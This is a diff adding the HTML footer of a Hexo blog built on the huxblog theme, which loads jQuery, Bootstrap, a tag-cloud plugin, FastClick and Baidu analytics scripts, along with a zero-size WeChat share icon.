+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
